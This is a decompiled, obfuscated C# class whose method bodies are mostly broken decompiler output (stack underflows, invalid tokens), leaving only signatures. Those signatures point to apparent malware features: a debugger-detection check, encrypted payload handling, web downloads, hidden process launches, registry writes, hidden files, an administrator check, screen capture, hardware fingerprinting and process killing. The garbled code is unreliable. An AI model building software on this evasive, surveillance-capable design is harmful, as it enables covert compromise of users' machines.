using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

internal class Class5
{
	public static bool bool_0;

	public static bool bool_1;

	public static bool bool_2;

	public static bool bool_3;

	public static bool bool_4;

	public static string string_0;

	public static string string_1;

	private static readonly List<string> list_0;

	public static string string_2;

	public static string string_3;

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_4);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_5);

	public static extern string smethod_0(string string_4);

	private unsafe static string smethod_1()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		_ = *(IntPtr*)(/*Error near IL_0002: Stack underflow*/ & 8);
		_ = 2;
		_ = long.MinValue;
		/*Error near IL_0010: ldarg 1 (out-of-bounds)*/;
		_ = 7;
		/*Error near IL_0014: Invalid metadata token*/;
	}

	private static extern void smethod_2(string string_4, string string_5, string string_6);

	private static extern void smethod_3();

	private static extern void smethod_4(string string_4);

	private static extern void smethod_5();

	private static extern void smethod_6(string string_4, string string_5);

	private static extern void Main();

	private static extern void smethod_7();

	private static extern bool smethod_8();

	private static extern bool smethod_9();

	private static extern bool smethod_10();

	private static string smethod_11()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		while (/*Error near IL_0005: Stack underflow*/ > /*Error near IL_0005: Stack underflow*/)
		{
		}
		checked
		{
			_ = (nint)/*Error near IL_0006: Stack underflow*/;
			/*Error near IL_0006: stloc 1 (out-of-bounds)*/;
			float num = ((float[])/*Error near IL_000a: Stack underflow*/)[59];
			return (string)(/*Error near IL_000b: Stack underflow*/ + num);
		}
	}

	private static extern void smethod_12();

	private static extern void smethod_13();

	public static extern bool smethod_14(string string_4);

	private static extern void smethod_15();

	public extern Class5();

	unsafe static byte[] smethod_16(string string_4)
	{
		//Discarded unreachable code: IL_000b, IL_0014, IL_001f
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Incompatible stack heights: 0 vs 1
		_003F val;
		do
		{
			/*OpCode not supported: DebugBreak*/;
			val = /*Error near IL_0002: Stack underflow*/+ /*Error near IL_0002: Stack underflow*/;
		}
		while (/*Error near IL_0007: Stack underflow*/ < val);
		_ = /*Error near IL_0008: Stack underflow*/| /*Error near IL_0008: Stack underflow*/;
		_ = *(object*)(nint)/*Error near IL_0008: ldarg 2 (out-of-bounds)*/;
		/*Error near IL_000a: Unknown opcode: 0xFD*/;
	}

	static RijndaelManaged smethod_17()
	{
		//Discarded unreachable code: IL_0008
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Incompatible stack heights: 0 vs 1
		checked
		{
			while (true)
			{
				_003F val = /*Error: ldloc 2 (out-of-bounds)*/;
				_003F val2 = /*Error near IL_0002: Stack underflow*/+ val;
				_ = /*Error near IL_0003: Stack underflow*/* val2;
			}
		}
	}

	static extern void smethod_18(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static void smethod_19(SymmetricAlgorithm symmetricAlgorithm_0, int int_0)
	{
		//Discarded unreachable code: IL_0009, IL_0012
		//IL_0004: Expected I, but got Unknown
		((short[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/] = (short)/*Error near IL_0001: Stack underflow*/;
		float num = ((float[])/*Error near IL_0002: Stack underflow*/)[/*Error near IL_0002: Stack underflow*/];
		_003F val = /*Error near IL_0002: ldarg 2 (out-of-bounds)*/;
		((IntPtr[])/*Error near IL_0004: Stack underflow*/)[num] = (IntPtr)val;
		/*Error near IL_0004: Invalid metadata token*/;
	}

	static extern Encoding smethod_20();

	static extern byte[] smethod_21(Encoding encoding_0, string string_4);

	static extern void smethod_22(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	static extern void smethod_23(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	static extern void smethod_24(SymmetricAlgorithm symmetricAlgorithm_0, PaddingMode paddingMode_0);

	unsafe static void smethod_25(SymmetricAlgorithm symmetricAlgorithm_0, CipherMode cipherMode_0)
	{
		//Discarded unreachable code: IL_000b
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		*(_003F*)(nint)/*Error near IL_0001: Stack underflow*/ = /*Error near IL_0001: Stack underflow*/;
		_ = *(sbyte*)(nint)/*Error near IL_0003: Stack underflow*/ ^ /*Error near IL_0003: ldloca 0 (out-of-bounds)*/;
		/*Error near IL_0006: Invalid metadata token*/;
	}

	static extern byte[] smethod_26(SymmetricAlgorithm symmetricAlgorithm_0);

	static extern byte[] smethod_27(SymmetricAlgorithm symmetricAlgorithm_0);

	static extern ICryptoTransform smethod_28(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0, byte[] byte_1);

	static extern byte[] smethod_29(ICryptoTransform icryptoTransform_0, byte[] byte_0, int int_0, int int_1);

	static extern Encoding smethod_30();

	static extern string smethod_31(Encoding encoding_0, byte[] byte_0);

	static extern void smethod_32(IDisposable idisposable_0);

	static string smethod_33(string string_4)
	{
		//Discarded unreachable code: IL_000e
		//IL_0003: Invalid comparison between Unknown and I4
		uint num;
		do
		{
			/*OpCode not supported: DebugBreak*/;
			num = checked((uint)(int)/*Error near IL_0002: Stack underflow*/);
		}
		while ((int)/*Error near IL_0008: Stack underflow*/ <= (int)num);
		checked
		{
			_ = (short)/*Error near IL_0009: Stack underflow*/;
			/*Error near IL_0009: Invalid metadata token*/;
		}
	}

	static extern WebClient smethod_34();

	static extern string smethod_35(string string_4, string string_5);

	static void smethod_36(WebClient webClient_0, string string_4, string string_5)
	{
		//Discarded unreachable code: IL_0005, IL_000e, IL_0014, IL_001a, IL_001f, IL_002a, IL_0032, IL_0038, IL_003a
		//IL_0009: Invalid comparison between Unknown and I4
		//IL_000e: Unsupported input type for neg.
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		/*Error: Invalid metadata token*/;
	}

	static extern void smethod_37(Component component_0);

	static extern Process smethod_38();

	static extern ProcessStartInfo smethod_39();

	static extern void smethod_40(ProcessStartInfo processStartInfo_0, ProcessWindowStyle processWindowStyle_0);

	static void smethod_41(ProcessStartInfo processStartInfo_0, string string_4)
	{
		//Discarded unreachable code: IL_000d, IL_0016, IL_001d, IL_0025
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected I4, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		/*OpCode not supported: Ckfinite*/;
		/*Error near IL_0008: Invalid metadata token*/;
	}

	static extern string smethod_42(string string_4, string string_5, string string_6);

	static void smethod_43(ProcessStartInfo processStartInfo_0, string string_4)
	{
		//Discarded unreachable code: IL_000a, IL_000f
		while (/*Error near IL_0005: Stack underflow*/ < /*Error near IL_0005: Stack underflow*/)
		{
		}
		/*Error near IL_0005: Invalid metadata token*/;
	}

	static extern void smethod_44(Process process_0, ProcessStartInfo processStartInfo_0);

	static extern bool smethod_45(Process process_0);

	static extern void smethod_46(int int_0);

	static extern void smethod_47(string string_4);

	static extern string smethod_48(string string_4);

	static extern RegistryKey smethod_49(RegistryKey registryKey_0, string string_4, RegistryKeyPermissionCheck registryKeyPermissionCheck_0);

	static extern RegistryKey smethod_50(RegistryKey registryKey_0, string string_4);

	static extern void smethod_51(RegistryKey registryKey_0, string string_4, object object_0, RegistryValueKind registryValueKind_0);

	static extern object smethod_52(RegistryKey registryKey_0, string string_4);

	static extern void smethod_53(ProcessStartInfo processStartInfo_0, bool bool_5);

	static extern void smethod_54(ProcessStartInfo processStartInfo_0, bool bool_5);

	static extern void smethod_55(ProcessStartInfo processStartInfo_0, bool bool_5);

	static StreamReader smethod_56(Process process_0)
	{
		//Discarded unreachable code: IL_0011, IL_0013, IL_0025, IL_002e
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got I4
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Unsupported input type for neg.
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got I4
		while (/*Error near IL_0005: Stack underflow*/ > /*Error near IL_0005: Stack underflow*/)
		{
		}
		ushort num = ((ushort[])/*Error near IL_0006: Stack underflow*/)[/*Error near IL_0006: Stack underflow*/];
		IntPtr intPtr = (nint)((Array)(uint)(/*Error near IL_0009: Stack underflow*/ / num)).LongLength;
		checked
		{
			_ = /*Error near IL_000c: Stack underflow*/+ unchecked((nuint)(nint)intPtr);
			/*Error near IL_000c: Invalid metadata token*/;
		}
	}

	static string smethod_57(TextReader textReader_0)
	{
		//Discarded unreachable code: IL_0005, IL_000a, IL_000b, IL_0010, IL_001a
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Unsupported input type for neg.
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		/*Error: Invalid metadata token*/;
	}

	static extern bool smethod_58(string string_4, string string_5);

	static extern bool smethod_59(string string_4, string string_5);

	static extern bool smethod_60(StreamReader streamReader_0);

	static extern Assembly smethod_61();

	static Stream smethod_62(Assembly assembly_0, string string_4)
	{
		//IL_0001: Invalid comparison between Unknown and I4
		byte num;
		do
		{
			num = checked((byte)/*Error near IL_0001: Stack underflow*/);
		}
		while ((int)/*Error near IL_0006: Stack underflow*/ != num);
		/*Error: Unexpected end of block*/;
	}

	static extern FileStream smethod_63(string string_4, FileMode fileMode_0, FileAccess fileAccess_0);

	static extern void smethod_64(Stream stream_0, Stream stream_1);

	static extern Process smethod_65(string string_4);

	static string smethod_66(Assembly assembly_0)
	{
		//Discarded unreachable code: IL_0005, IL_000a, IL_0015
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		/*Error: Invalid metadata token*/;
	}

	static void smethod_67(string string_4, string string_5, bool bool_5)
	{
		//Discarded unreachable code: IL_0005, IL_000f, IL_0016, IL_001b, IL_0020
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Expected F8, but got Unknown
		while (true)
		{
		}
	}

	unsafe static RegistryKey smethod_68(RegistryKey registryKey_0, string string_4, bool bool_5)
	{
		//IL_000a: Expected I, but got O
		object obj = *(object*)(int)(ushort)(*(nuint*)(&registryKey_0));
		((IntPtr[])/*Error near IL_000a: Stack underflow*/)[0] = (IntPtr)obj;
		_ = (short)(*(byte*)(int)(*(uint*)(nint)/*Error near IL_000b: Stack underflow*/));
		/*Error near IL_000e: Invalid metadata token*/;
	}

	static extern void smethod_69(RegistryKey registryKey_0, string string_4, object object_0);

	static extern void smethod_70(string string_4, FileAttributes fileAttributes_0);

	static DialogResult smethod_71(string string_4, string string_5, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0)
	{
		while (true)
		{
			((sbyte[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/] = (sbyte)/*Error near IL_0001: Stack underflow*/;
			if (/*Error near IL_0007: Stack underflow*/ >= /*Error near IL_0007: Stack underflow*/)
			{
				/*Error: Could not find block for branch target IL_0007*/;
			}
		}
	}

	static void smethod_72(RegistryKey registryKey_0)
	{
		//Discarded unreachable code: IL_0005, IL_000b, IL_0011, IL_0014, IL_0019, IL_0020, IL_0025, IL_002a, IL_0032
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Invalid comparison between F8 and I4
		/*Error: Invalid metadata token*/;
	}

	static extern WindowsIdentity smethod_73();

	static extern WindowsPrincipal smethod_74(WindowsIdentity windowsIdentity_0);

	static bool smethod_75(WindowsPrincipal windowsPrincipal_0, WindowsBuiltInRole windowsBuiltInRole_0)
	{
		//IL_0005: Expected I4, but got F4
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected I4, but got Unknown
		float num = ((float[])/*Error near IL_0003: Stack underflow*/)[/*Error near IL_0003: Stack underflow*/];
		((sbyte[])/*Error near IL_0005: Stack underflow*/)[/*Error near IL_0005: Stack underflow*/] = (sbyte)(int)num;
		int num2 = checked((byte)/*Error near IL_0006: Stack underflow*/);
		switch (/*Error near IL_0009: Stack underflow*/ % num2)
		{
		default:
			;
			break;
		}
		/*Error: Unexpected end of block*/;
	}

	static extern Assembly smethod_76();

	static extern string smethod_77(string string_4);

	static extern bool smethod_78(string string_4, string string_5);

	static extern Rectangle smethod_79(Point point_0);

	static extern Bitmap smethod_80(int int_0, int int_1);

	static Graphics smethod_81(Image image_0)
	{
		//Discarded unreachable code: IL_0009
		//IL_0002: Expected I4, but got O
		//IL_0003: Invalid comparison between Unknown and I4
		sbyte num;
		do
		{
			((short[])/*Error near IL_0002: Stack underflow*/)[/*Error near IL_0002: Stack underflow*/] = (short)(int)null;
			num = ((sbyte[])/*Error near IL_0003: Stack underflow*/)[/*Error near IL_0003: Stack underflow*/];
		}
		while ((int)/*Error near IL_0008: Stack underflow*/ == num);
		/*Error near IL_0008: Unknown opcode: 0xFC*/;
	}

	static extern void smethod_82(Graphics graphics_0, Point point_0, Point point_1, Size size_0);

	unsafe static ImageFormat smethod_83()
	{
		//Discarded unreachable code: IL_000b, IL_001e
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Expected native int or pointer, but got F8
		nint num;
		checked
		{
			num = (nint)unchecked(/*Error near IL_0001: Stack underflow*/ % /*Error near IL_0001: Stack underflow*/);
		}
		_ = *(object*)(nint)((double[])/*Error near IL_0003: Stack underflow*/)[num];
		/*Error near IL_0006: Invalid metadata token*/;
	}

	static extern void smethod_84(Image image_0, string string_4, ImageFormat imageFormat_0);

	static bool smethod_85(string string_4)
	{
		//Discarded unreachable code: IL_000a
		while (/*Error near IL_0005: Stack underflow*/ > /*Error near IL_0005: Stack underflow*/)
		{
		}
		/*Error near IL_0005: Invalid metadata token*/;
	}

	static extern void smethod_86(Process process_0);

	static string[] smethod_87(string string_4, char[] char_0)
	{
		//Discarded unreachable code: IL_0008, IL_000f, IL_0014, IL_0019, IL_0025, IL_0029, IL_002e
		//IL_001b: Expected I8, but got F8
		//IL_001e: Expected I4, but got O
		/*Error: ldarg 2 (out-of-bounds)*/;
		_ = 6;
		/*Error near IL_0002: stloc 2 (out-of-bounds)*/;
		/*Error near IL_0003: Invalid metadata token*/;
	}

	static extern string smethod_88(WebClient webClient_0, string string_4);

	static extern string smethod_89();

	static extern string smethod_90();

	static string smethod_91(string[] string_4)
	{
		//Discarded unreachable code: IL_000f, IL_0016, IL_001b, IL_0020
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Invalid comparison between I4 and Unknown
		//IL_0027: Incompatible stack heights: 0 vs 1
		while (true)
		{
			if (/*Error near IL_0005: Stack underflow*/ < /*Error near IL_0005: Stack underflow*/)
			{
				int num = ((int[])/*Error near IL_0006: Stack underflow*/)[/*Error near IL_0006: Stack underflow*/];
				_003F val = /*Error near IL_0006: ldarg 1 (out-of-bounds)*/;
				if (/*Error near IL_000d: Stack underflow*/ >= num - val)
				{
					break;
				}
			}
		}
		/*Error near IL_000e: Unknown opcode: 0xF8*/;
	}

	unsafe static void smethod_92(string string_4, string string_5)
	{
		//Discarded unreachable code: IL_0025
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Invalid comparison between I4 and Unknown
		//IL_000a: Incompatible stack heights: 0 vs 1
		//IL_0018: Invalid comparison between Unknown and F4
		checked
		{
			while (true)
			{
				_003F val = /*Error near IL_0002: Stack underflow*/* /*Error near IL_0002: Stack underflow*/;
				_003F val2 = /*Error near IL_0003: Stack underflow*/& val;
				_ = (byte)unchecked(/*Error near IL_0005: Stack underflow*/ / (short)val2);
				/*OpCode not supported: DebugBreak*/;
				if (0 > unchecked((int)/*Error near IL_0008: ldloc 1 (out-of-bounds)*/))
				{
					byte num = (byte)/*Error near IL_0010: Stack underflow*/;
					*unchecked((byte*)(nint)/*Error near IL_0011: Stack underflow*/) = num;
					if ((float)/*Error near IL_001d: Stack underflow*/ == 9.991376E-35f)
					{
						break;
					}
				}
			}
			short num2 = ((short[])/*Error near IL_001e: Stack underflow*/)[/*Error near IL_001e: Stack underflow*/];
			_ = (ushort)unchecked((ulong)((long[])/*Error near IL_001f: Stack underflow*/)[num2]);
			/*Error near IL_0020: Invalid metadata token*/;
		}
	}

	static Process[] smethod_93()
	{
		while (true)
		{
			if (/*Error near IL_0002: ldarg 2 (out-of-bounds)*/ == /*Error near IL_0003: ldloc 1 (out-of-bounds)*/)
			{
				/*Error: Could not find block for branch target IL_0009*/;
			}
		}
	}

	static extern string smethod_94(Process process_0);

	static extern void smethod_95(Process process_0);

	unsafe static Process smethod_96()
	{
		//Discarded unreachable code: IL_0021, IL_0026, IL_002f, IL_0034
		//IL_0003: Invalid comparison between I4 and Unknown
		//IL_0016: Incompatible stack heights: 0 vs 2
		//IL_0037: Expected I, but got O
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			if (*(int*)(nint)/*Error near IL_0001: Stack underflow*/ <= (int)/*Error near IL_0002: ldloc 1 (out-of-bounds)*/)
			{
				checked
				{
					_ = (uint)unchecked((short)/*Error near IL_0009: Stack underflow*/);
				}
				_ = *(nint*)unchecked((nuint)null);
				if ("" != null)
				{
					break;
				}
			}
		}
		/*Error near IL_001c: Invalid metadata token*/;
	}

	static extern IntPtr smethod_97(Process process_0);

	static extern ManagementObjectSearcher smethod_98(string string_4);

	static extern ManagementObjectCollection smethod_99(ManagementObjectSearcher managementObjectSearcher_0);

	static extern ManagementObjectEnumerator smethod_100(ManagementObjectCollection managementObjectCollection_0);

	static extern ManagementBaseObject smethod_101(ManagementObjectEnumerator managementObjectEnumerator_0);

	static extern object smethod_102(ManagementBaseObject managementBaseObject_0, string string_4);

	static extern string smethod_103(object object_0);

	static extern string smethod_104(string string_4);

	static extern bool smethod_105(string string_4, string string_5);

	static string smethod_106(string string_4)
	{
		//Discarded unreachable code: IL_0003, IL_0008, IL_000e, IL_0015, IL_001d, IL_0022, IL_002f, IL_0034
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		/*Error: ldarg 3 (out-of-bounds)*/;
		/*Error near IL_0002: Unknown opcode: 0xFD*/;
	}

	static extern bool smethod_107(string string_4, string string_5);

	static extern bool smethod_108(ManagementObjectEnumerator managementObjectEnumerator_0);

	unsafe static NetworkInterface[] smethod_109()
	{
		//Discarded unreachable code: IL_0007, IL_000c, IL_0013, IL_0018, IL_001d, IL_0022
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		uint num = checked((uint)(ulong)/*Error: ldloca 0 (out-of-bounds)*/);
		_ = *(byte*)(nint)(/*Error near IL_0005: Stack underflow*/ >> (int)num);
		/*Error near IL_0006: Unknown opcode: 0xFC*/;
	}

	static OperationalStatus smethod_110(NetworkInterface networkInterface_0)
	{
		return (OperationalStatus)/*Error near IL_0002: Stack underflow*/;
	}

	static extern PhysicalAddress smethod_111(NetworkInterface networkInterface_0);

	static extern string smethod_112(string string_4, char[] char_0);

	static extern string smethod_113(Environment.SpecialFolder specialFolder_0);

	unsafe static bool smethod_114(string string_4)
	{
		//Discarded unreachable code: IL_000d, IL_0012
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		while (/*Error near IL_0005: Stack underflow*/ <= /*Error near IL_0005: Stack underflow*/)
		{
		}
		int num = *(int*)(nint)/*Error near IL_0006: Stack underflow*/;
		checked
		{
			_ = /*Error near IL_0007: Stack underflow*/+ num;
			/*Error near IL_0008: Invalid metadata token*/;
		}
	}

	static extern string[] smethod_115(string string_4, string string_5);

	static extern Match smethod_116(string string_4, string string_5);

	static extern WebHeaderCollection smethod_117(WebClient webClient_0);

	static extern void smethod_118(WebHeaderCollection webHeaderCollection_0, HttpRequestHeader httpRequestHeader_0, string string_4);

	static extern byte[] smethod_119(string string_4);

	static extern Encoding smethod_120();

	static int smethod_121(string string_4, string string_5)
	{
		//Discarded unreachable code: IL_0001, IL_000f, IL_0014, IL_0019
		//IL_000a: Invalid comparison between Unknown and F8
		/*Error: Unknown opcode: 0xF8*/;
	}

	static extern string smethod_122(string string_4, int int_0, int int_1);

	static extern string smethod_123(string string_4, int int_0, string string_5);

	static extern void smethod_124(string string_4, byte[] byte_0);
}
